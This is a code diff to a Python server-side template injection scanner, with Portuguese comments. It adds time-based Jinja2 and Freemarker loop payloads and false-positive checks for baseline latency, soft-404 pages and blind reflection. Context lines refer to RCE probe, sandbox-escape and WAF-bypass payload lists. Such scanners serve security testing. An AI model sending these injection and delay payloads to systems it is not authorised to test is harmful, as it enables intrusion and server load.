@@ -43,6 +43,14 @@ DETECTION_PAYLOADS = [
     ("{{7*7}}${7*7}<%=7*7%>#{7*7}{7*7}", "49", "POLYGLOT_MULTI"),
 ]
 
+# ──────────── TIME-BASED PAYLOADS (Para WAFs cegos) ────────────
+TIME_PAYLOADS = [
+    # Jinja2 / Nunjucks
+    ("{% for i in range(10000) %}{% for j in range(1000) %}{% endfor %}{% endfor %}", "JINJA2_TIME_BASED"),
+    # Freemarker
+    ("<#list 1..10000000 as i></#list>", "FREEMARKER_TIME_BASED"),
+]
+
 # ──────────── EXPLOITATION PAYLOADS (RCE probes) ────────────
 EXPLOIT_PAYLOADS = [
     # Jinja2 sandbox escape 2026 (lipsum, cycler, joiner)
@@ -95,6 +103,42 @@ WAF_BYPASS = [
 ]
 
 
+import time
+
+
+def _get_baseline_latency(target):
+    """Calcula a latência base do alvo para mitigar falsos positivos em payloads time-based."""
+    try:
+        start = time.time()
+        requests.get(f"http://{target}/?cascavel_ssti_test=1", timeout=5)
+        return time.time() - start
+    except Exception:
+        return 0.5
+
+
+def _get_404_baseline(target):
+    """Calcula o tamanho da página de erro (baseline diffing) para evitar Soft-404."""
+    url = f"http://{target}/?cascavel_param_test_123=invalid_value_test_404"
+    try:
+        resp = requests.get(url, timeout=6)
+        return len(resp.text)
+    except Exception:
+        return 0
+
+
+def _verify_waf_blind_reflection(target, param, payload_str):
+    """Verifica se o WAF/Server apenas reflete a string sem avaliá-la, gerando falso positivo."""
+    test_val = "cascavel_blind_reflection_test_12345"
+    url = f"http://{target}/?{param}={urllib.parse.quote(test_val, safe='')}"
+    try:
+        resp = requests.get(url, timeout=5)
+        if test_val in resp.text:
+            return True
+        return False
+    except Exception:
+        return False
+
+
 def _is_evaluated(resp_text, payload, indicator):
     """Verifica avaliação real (não reflexão literal do payload)."""
     if indicator not in resp_text:
@@ -135,16 +179,28 @@ def run(target, ip, open_ports, banners):
     vulns = []
     detected_params = set()
 
+    baseline_latency = _get_baseline_latency(target)
+    baseline_len = _get_404_baseline(target)
+
+    # Verifica WAF reflection no param
+    def check_fp(param_name, resp_text):
+        if baseline_len > 0 and abs(len(resp_text) - baseline_len) / baseline_len < 0.05:
+            return True
+        return False
+
     for param in PARAMS:
         # Phase 1: Detection
         for payload, indicator, engine in DETECTION_PAYLOADS:
             url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
             try:
                 resp = requests.get(url, timeout=6)
+                if check_fp(param, resp.text):
+                    continue
                 if resp.status_code == 200 and _is_evaluated(resp.text, payload, indicator):
-                    vulns.append(_build_vuln(engine, param, payload, "ALTO"))
-                    detected_params.add(param)
-                    break
+                    if not _verify_waf_blind_reflection(target, param, payload):
+                        vulns.append(_build_vuln(engine, param, payload, "ALTO"))
+                        detected_params.add(param)
+                        break
             except Exception:
                 continue
 
@@ -154,9 +210,12 @@ def run(target, ip, open_ports, banners):
                 url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
                 try:
                     resp = requests.get(url, timeout=8)
+                    if check_fp(param, resp.text):
+                        continue
                     if indicator and indicator in resp.text:
-                        vulns.append(_build_vuln(engine, param, payload))
-                        break
+                        if not _verify_waf_blind_reflection(target, param, payload):
+                            vulns.append(_build_vuln(engine, param, payload))
+                            break
                 except Exception:
                     continue
 
@@ -165,9 +224,12 @@ def run(target, ip, open_ports, banners):
             url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
             try:
                 resp = requests.get(url, timeout=6)
+                if check_fp(param, resp.text):
+                    continue
                 if resp.status_code == 200 and (indicator in resp.text if indicator else len(resp.text) > 500):
-                    vulns.append(_build_vuln(engine, param, payload, "ALTO"))
-                    break
+                    if not _verify_waf_blind_reflection(target, param, payload):
+                        vulns.append(_build_vuln(engine, param, payload, "ALTO"))
+                        break
             except Exception:
                 continue
 
@@ -180,6 +242,24 @@ def run(target, ip, open_ports, banners):
                     if indicator and indicator in resp.text:
                         vulns.append(_build_vuln(f"WAF_BYPASS_{engine}", param, payload))
                         break
+                except Exception:
+                    continue
+
+        # Phase 5: Time-Based Detection (Se blind e suspeito)
+        if param not in detected_params:
+            for payload, engine in TIME_PAYLOADS:
+                url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
+                try:
+                    start = time.time()
+                    resp = requests.get(url, timeout=10)
+                    elapsed = time.time() - start
+                    # Se o payload causou um atraso considerável vs baseline (WAF pode bloquear com time delay, mas toleramos + 3.0)  # noqa: E501
+                    if elapsed > (baseline_latency + 3.0) and resp.status_code == 200:
+                        vulns.append(_build_vuln(engine, param, payload, "ALTO"))
+                        break
+                except requests.exceptions.Timeout:
+                    vulns.append(_build_vuln(f"{engine}_TIMEOUT", param, payload, "ALTO"))
+                    break
                 except Exception:
                     continue
 
